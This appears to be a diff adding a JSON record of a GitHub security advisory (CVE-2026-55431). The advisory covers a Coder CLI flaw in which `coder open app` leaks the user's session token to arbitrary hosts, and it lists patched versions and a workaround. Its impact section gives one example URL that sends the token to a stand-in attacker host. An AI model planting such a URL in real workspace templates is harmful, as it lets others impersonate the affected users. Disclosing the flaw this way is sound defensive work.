@@ -1,0 +1,148 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-55431",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-522",
+      "CWE-601"
+    ],
+    "description": "### Summary\n\n`coder open app` opens external workspace-app URLs without validating the scheme or host. When an external app URL contains the `$SESSION_TOKEN` placeholder the CLI replaces it with the user's real session token before handing the URL to the OS open handler.\n\n> **Note:** Practical exploitation requires the victim to run `coder open app` against a workspace whose external app definition the attacker controls. Only a malicious template author can control external app URLs.\n\n### Impact\n\nWorkspace code can register external apps with arbitrary URLs so an attacker who controls workspace contents can define a URL like `https://attacker.example/?t=$SESSION_TOKEN`. Running `coder open app` then sends the user's session token to the attacker and enables full account impersonation for the token's lifetime. The same path can invoke arbitrary local URI scheme handlers. Exploitation requires the user to run `coder open app` against a workspace that contains a malicious external app.\n\n### Patches\n\nThe fix applies a URL-scheme allowlist in the CLI and limits `$SESSION_TOKEN` substitution to trusted destinations like the web frontend.\n\nThe fix was backported to all supported release lines:\n\n| Release line | Patched version |\n|---|---|\n| 2.34 | [v2.34.2](https://github.com/coder/coder/releases/tag/v2.34.2) |\n| 2.33 | [v2.33.8](https://github.com/coder/coder/releases/tag/v2.33.8) |\n| 2.32 | [v2.32.7](https://github.com/coder/coder/releases/tag/v2.32.7) |\n| 2.29 (ESR) | [v2.29.17](https://github.com/coder/coder/releases/tag/v2.29.17) |\n\n### Workarounds\n\nAvoid running `coder open app` for untrusted workspaces.\n\n### Resources\n\n- Fix: #26146\n\n### Credits\n\nCoder would like to thank Anthropic's Security Team (ANT-2026-22457) for independently disclosing this issue!",
+    "ghsa_id": "GHSA-v54h-cp2w-9x4g",
+    "html_url": "https://github.com/advisories/GHSA-v54h-cp2w-9x4g",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v54h-cp2w-9x4g"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-55431"
+      }
+    ],
+    "published_at": "2026-07-06T21:07:40Z",
+    "references": [
+      "https://github.com/coder/coder/security/advisories/GHSA-v54h-cp2w-9x4g",
+      "https://github.com/coder/coder/pull/26146",
+      "https://github.com/advisories/GHSA-v54h-cp2w-9x4g"
+    ],
+    "severity": "high",
+    "summary": "Coder's session token leaked to arbitrary hosts via `coder open app` for external workspace apps",
+    "updated_at": "2026-07-06T21:07:43Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "2.34.2",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "vulnerable_version_range": ">= 2.34.0, < 2.34.2"
+      },
+      {
+        "first_patched_version": "2.33.8",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "vulnerable_version_range": ">= 2.33.0, < 2.33.8"
+      },
+      {
+        "first_patched_version": "2.32.7",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "vulnerable_version_range": ">= 2.30.0, < 2.32.7"
+      },
+      {
+        "first_patched_version": "2.29.17",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "vulnerable_version_range": "< 2.29.17"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-v54h-cp2w-9x4g",
+  "repo": {
+    "cve_id": "CVE-2026-55431",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-522",
+      "CWE-601"
+    ],
+    "description": "### Summary\r\n\r\n`coder open app` opens external workspace-app URLs without validating the scheme or host. When an external app URL contains the `$SESSION_TOKEN` placeholder the CLI replaces it with the user's real session token before handing the URL to the OS open handler.\r\n\r\n> **Note:** Practical exploitation requires the victim to run `coder open app` against a workspace whose external app definition the attacker controls. Only a malicious template author can control external app URLs.\r\n\r\n### Impact\r\n\r\nWorkspace code can register external apps with arbitrary URLs so an attacker who controls workspace contents can define a URL like `https://attacker.example/?t=$SESSION_TOKEN`. Running `coder open app` then sends the user's session token to the attacker and enables full account impersonation for the token's lifetime. The same path can invoke arbitrary local URI scheme handlers. Exploitation requires the user to run `coder open app` against a workspace that contains a malicious external app.\r\n\r\n### Patches\r\n\r\nThe fix applies a URL-scheme allowlist in the CLI and limits `$SESSION_TOKEN` substitution to trusted destinations like the web frontend.\r\n\r\nThe fix was backported to all supported release lines:\r\n\r\n| Release line | Patched version |\r\n|---|---|\r\n| 2.34 | [v2.34.2](https://github.com/coder/coder/releases/tag/v2.34.2) |\r\n| 2.33 | [v2.33.8](https://github.com/coder/coder/releases/tag/v2.33.8) |\r\n| 2.32 | [v2.32.7](https://github.com/coder/coder/releases/tag/v2.32.7) |\r\n| 2.29 (ESR) | [v2.29.17](https://github.com/coder/coder/releases/tag/v2.29.17) |\r\n\r\n### Workarounds\r\n\r\nAvoid running `coder open app` for untrusted workspaces.\r\n\r\n### References\r\n\r\n- Fix: #26146\r\n\r\n### Credits\r\n\r\nWe'd like to thank Anthropic's Security Team (ANT-2026-22457) for independently disclosing this issue!\r\n",
+    "ghsa_id": "GHSA-v54h-cp2w-9x4g",
+    "html_url": "https://github.com/coder/coder/security/advisories/GHSA-v54h-cp2w-9x4g",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v54h-cp2w-9x4g"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-55431"
+      }
+    ],
+    "published_at": "2026-06-12T15:00:01Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Session token leaked to arbitrary hosts via `coder open app` for external workspace apps",
+    "updated_at": "2026-06-16T22:10:59Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "patched_versions": "2.34.2",
+        "vulnerable_version_range": ">= 2.34.0, < 2.34.2"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "patched_versions": "2.33.8",
+        "vulnerable_version_range": ">= 2.33.0, < 2.33.8"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "patched_versions": "2.32.7",
+        "vulnerable_version_range": ">= 2.30.0, < 2.32.7"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "patched_versions": "2.29.17",
+        "vulnerable_version_range": "< 2.29.17"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coder/coder"
+}
